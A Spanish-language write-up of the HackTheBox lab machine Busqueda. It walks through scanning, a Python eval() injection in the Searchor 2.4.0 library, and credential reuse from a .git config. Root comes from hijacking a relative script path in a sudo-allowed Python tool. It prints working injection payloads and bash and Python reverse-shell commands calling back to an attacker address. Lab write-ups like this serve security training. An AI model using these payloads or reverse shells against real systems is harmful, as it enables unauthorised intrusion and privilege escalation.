---
title: Busqueda Writeup - HackTheBox
date: 2023-06-21
categories: [Writeups, HTB]
tags: [Linux, HTB, CTF, Easy, HTTP, Python, Searchor, eval()]
img_path: /assets/img/commons/busqueda/
image: busqueda.png
---

¡Saludos!

En este writeup, nos adentraremos en la máquina [**Busqueda**](https://app.hackthebox.com/machines/537) de **HackTheBox**, la cual tiene un nivel de dificultad **fácil** según la plataforma. Esta máquina **Linux** será el escenario donde llevaremos a cabo una **enumeración web** y localizaremos una página que hace uso de una biblioteca de **Python** llamada **Searchor**, la cual es vulnerable a la ejecución de código arbitrario a través del método **eval()**. Esta vulnerabilidad nos permitirá obtener acceso al sistema. Finalmente, escalaremos nuestros privilegios aprovechando los permisos de sudo en un script de Python que carece de una sanitización adecuada, lo que nos habilitará para ejecutar comandos de Python arbitrarios.

¡Vamos a empezar!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.11.208
PING 10.10.11.208 (10.10.11.208) 56(84) bytes of data.
64 bytes from 10.10.11.208: icmp_seq=1 ttl=63 time=110 ms

--- 10.10.11.208 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.839/109.839/109.839/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 2000 10.10.11.208 -oG allPorts.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 20:44 -05
Nmap scan report for 10.10.11.208
Host is up (0.12s latency).
Not shown: 65464 closed tcp ports (reset), 69 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.96 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 22,80 -sV -sC --min-rate 2000 10.10.11.208 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-21 20:45 -05
Nmap scan report for 10.10.11.208
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds
```

El informe de `nmap` revela que se están ejecutando los servicios **SSH** (`OpenSSH 8.9p1`) y **HTTP** (`Apache 2.4.52`). Además, al intentar acceder al servicio HTTP, se redirige al dominio `searcher.htb`.

### HTTP - 80

Agregamos el dominio `searcher.htb` a nuestro archivo hosts.

```bash
❯ echo '10.10.11.208\tsearcher.htb' >> /etc/hosts
```

Accedemos a la siguiente página web, que funciona como un motor de búsqueda unificado capaz de generar URL de consulta para varios motores de búsqueda diferentes.

![web](web.png)

Al final de la página, se observa que se utiliza la versión `2.4.0` de la librería de Python llamada [Searchor](https://github.com/ArjunSharda/Searchor).

Al realizar una consulta en Internet, encontramos que esta versión es vulnerable a ejecución de código arbitrario (Arbitrary code execution).

![vuln](vuln.png)

Se nos proporciona un [Commit de GitHub](https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b) que contiene los cambios realizados para prevenir la vulnerabilidad.

![commit](commit.png)

## Explotación

---

Al parecer, anteriormente se utilizaba el método `eval()` de Python. En este [post](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/), se señala que el método `eval()` de Python es vulnerable a la ejecución de código arbitrario y se proporcionan algunos ejemplos que podríamos emplear para eludir las expresiones de la consulta.

![eval](eval.png)

En nuestro caso, utilizaremos el siguiente payload.

```bash
'),__import__('os').system('id')#
```

Capturamos la solicitud con Burp Suite y la modificamos para observar su comportamiento.

En la respuesta, observamos que el comando `id` se ejecutó correctamente.

![request](request.png)

Ahora, utilizamos el siguiente payload para obtener una reverse shell.

```bash
'),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.41/9001 0>&1"')#
```

![payload](payload.png)

Una vez que hemos establecido la escucha en el puerto `444`, presionamos "**Search**" y logramos obtener acceso al sistema como usuario `svc`.

```bash
❯ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.208] 47898
bash: cannot set terminal process group (1641): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ whoami
whoami
svc
```

Para obtener una shell más interactiva, realizamos un [Tratamiento de la TTY](https://r1vs3c.github.io/posts/tratamiento-tty/).

En este punto, ya tenemos acceso a la flag de usuario.

```bash
svc@busqueda:~$ ls -al
total 44
drwxr-x--- 5 svc  svc  4096 Jun 22 02:10 .
drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..
lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
drwx------ 2 svc  svc  4096 Jun 22 02:11 .ssh
-rw-r----- 1 root svc    33 Jun 22 01:43 user.txt
-rw------- 1 svc  svc   748 Jun 22 01:50 .viminfo
svc@busqueda:~$ cat user.txt 
4a7480a3b6c75f12****************
```

## Escalación de privilegios

---

El código web se encuentra en `/var/www/app` y al listar los archivos y directorios, encontramos la carpeta `.git`, lo que sugiere que esta aplicación se administra a través de **Git**.

```bash
svc@busqueda:/var/www/app$ ls -al
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Jun 22 01:43 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
```

Al acceder a la configuración de **Git**, encontramos las credenciales del usuario `cody`.

```bash
svc@busqueda:/var/www/app$ cd .git/
svc@busqueda:/var/www/app/.git$ ls -al
total 52
drwxr-xr-x 8 www-data www-data 4096 Jun 22 01:43 .
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

Con esta contraseña, podemos acceder al sistema a través de SSH con el usuario `svc`.

```bash
❯ ssh svc@10.10.11.208
The authenticity of host '10.10.11.208 (10.10.11.208)' can't be established.
ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.208' (ED25519) to the list of known hosts.
svc@10.10.11.208's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 22 02:37:17 AM UTC 2023

  System load:                      0.0
  Usage of /:                       80.4% of 8.26GB
  Memory usage:                     53%
  Swap usage:                       0%
  Processes:                        263
  Users logged in:                  1
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.208
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:84d7

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jun 22 02:28:59 2023 from 127.0.0.1
svc@busqueda:~$
```

Al ejecutar `sudo -l`, observamos que podemos ejecutar el script `system-checkup.py` como `root`.

```bash
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Lo ejecutamos para identificar su modo de uso.

Podemos realizar tres acciones: `docker-ps`, `docker-inspect` y `full-checkup`. Al parecer, `docker-ps` y `docker-inspect` funcionan correctamente, pero `docker-ps` muestra en la consola el mensaje "`Something went wrong`".

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Si accedemos al directorio `/opt/scripts/`, observamos varios scripts disponibles, entre ellos `full-checkup.sh`.

```bash
svc@busqueda:~$ cd /opt/scripts/
svc@busqueda:/opt/scripts$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Dec 24 18:23 .
drwxr-xr-x 4 root root 4096 Mar  1 10:46 ..
-rwx--x--x 1 root root  586 Dec 24 21:23 check-ports.py
-rwx--x--x 1 root root  857 Dec 24 21:23 full-checkup.sh
drwxr-x--- 8 root root 4096 Apr  3 15:04 .git
-rwx--x--x 1 root root 3346 Dec 24 21:23 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24 21:23 system-checkup.py
```

Si ejecutamos nuevamente el script `system-checkup.py` desde este directorio (`/opt/scripts/`), parece que funciona correctamente sin mostrar el mensaje de error previo.

```bash
svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
[=] Docker conteainers
{
  "/gitea": "running"
}
{
  "/mysql_db": "running"
}

[=] Docker port mappings
{
  "22/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "222"
    }
  ],
  "3000/tcp": [
    {
      "HostIp": "127.0.0.1",
      "HostPort": "3000"
    }
  ]
}

[=] Apache webhosts
[+] searcher.htb is up
[+] gitea.searcher.htb is up

[=] PM2 processes
┌─────┬────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id  │ name   │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├─────┼────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0   │ app    │ default     │ N/A     │ fork    │ 1641     │ 61m    │ 0    │ online    │ 0%       │ 30.5mb   │ svc      │ disabled │
└─────┴────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘

[+] Done!
```

Esto sugiere que la acción `full-checkup` hace uso del script `full-checkup.sh` y, anteriormente, se estaba intentando ejecutar desde el directorio actual, lo que falló porque ese archivo no existía en ese directorio. Al ejecutarlo desde el directorio `/opt/scripts/`, parece funcionar correctamente.

En ese caso, procedemos a acceder al directorio `/tmp` y creamos un script con el nombre `full-checkup.sh` que genere una reverse shell en Python.

```bash
#!/usr/bin/python3

import socket,os,pty;s=socket.socket();s.connect(("10.10.14.41",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
```

Nos ponemos a la escucha en el puerto especificado y luego ejecutamos nuevamente el script `system-checkup.py` desde el directorio `/tmp`.

```bash
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
[sudo] password for svc:
```

Hemos obtenido una shell como usuario `root`.

```bash
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.208] 40966
root@busqueda:/tmp# whoami
whoami
root
```

Como último paso, accedemos a la flag de `root`.

```bash
root@busqueda:/tmp# cd /root
cd /root
root@busqueda:~# ls
ls
ecosystem.config.js  root.txt  scripts  snap
root@busqueda:~# cat root.txt
cat root.txt
7d048a4a1d0bf275****************
```

!Happy Hacking¡


